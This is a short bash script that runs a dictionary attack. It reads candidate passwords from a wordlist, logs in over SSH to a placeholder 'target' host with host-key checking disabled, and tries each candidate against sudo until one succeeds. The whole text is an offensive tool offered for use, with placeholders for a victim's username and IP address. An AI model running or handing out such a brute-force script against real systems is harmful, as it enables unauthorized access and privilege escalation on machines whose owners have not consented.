#!/bin/bash

# Store the System's login/details
username='target-username'
targetvic='system-ip'

while read keypass; do
    if ssh "$username"@"$targetvic" -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no "echo $keypass | sudo -S echo 'sudo test'"; then
        echo "Pass found: $keypass"
        exit 0
    fi
done < YourFile.txt #file's name here

echo "The dictionary provided does not contain the right password."
